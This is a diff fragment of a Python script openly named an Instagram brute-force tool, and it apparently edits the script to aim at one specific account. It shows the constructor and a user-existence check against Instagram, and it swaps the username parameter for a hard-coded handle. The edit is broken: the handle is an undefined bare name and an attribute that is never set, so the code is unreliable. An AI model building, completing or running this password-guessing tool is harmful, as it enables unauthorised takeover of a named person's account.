@@ -76,16 +76,16 @@ def setProxy():
 #main class - Instagram bruteforce
 class Instabrute():
 	def __init__(self, username, passwords):
-		self.username = username
+		self.username = toomuchfahdah
 		if not self.userExists():
-			exit('[*] Can\'t find user named "%s"' % self.username)
+			exit('[*] Can\'t find user named "%s"' % self.toomuchfahdah)
 
 		self.passwords = passwords
 
 		self.attempts = 0 
 
 	def userExists(self):
-		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
+		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.toomuchfahdah) 
 		if r.status_code == 404:
 			return False
 		elif r.status_code == 200:
